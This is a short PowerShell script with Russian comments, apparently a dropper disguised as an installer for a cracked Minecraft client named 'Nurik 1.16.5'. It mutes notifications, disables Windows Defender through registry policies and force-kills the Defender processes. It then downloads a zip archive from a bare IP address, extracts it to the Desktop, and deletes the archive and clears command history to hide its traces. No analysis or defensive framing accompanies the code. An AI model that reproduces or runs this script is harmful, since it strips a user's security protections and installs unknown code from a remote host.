# Включение режима "Не беспокоить"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings" -Name "NOC_GLOBAL_SETTING_TOASTS_ENABLED" -Value 0 -ErrorAction SilentlyContinue

# Остановка Defender через реестр (если команды не работают)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f

# Принудительное завершение процессов Defender
Get-Process -Name "MsMpEng", "NisSrv", "SecurityHealthService" -ErrorAction SilentlyContinue | Stop-Process -Force

# Скачивание архива
$url = "http://176.108.245.12:25565/uploads/Nurik_1.16.5_crack_1.zip"
$tempPath = "$env:TEMP\Nurik_1.16.5_crack_1.zip"
try {
    Invoke-WebRequest -Uri $url -OutFile $tempPath -UserAgent "Wget/1.21.1" -TimeoutSec 30
}
catch {
    Write-Host "Ошибка скачивания. Используем резервный метод..."
    (New-Object Net.WebClient).DownloadFile($url, $tempPath)
}

# Распаковка архива
Add-Type -AssemblyName System.IO.Compression.FileSystem
$destinationPath = "$env:USERPROFILE\Desktop\Nurik1.16.5"
if (!(Test-Path $destinationPath)) { New-Item -ItemType Directory -Path $destinationPath -Force }
[System.IO.Compression.ZipFile]::ExtractToDirectory($tempPath, $destinationPath)

# Очистка следов
Remove-Item -Path $tempPath -Force
Clear-History
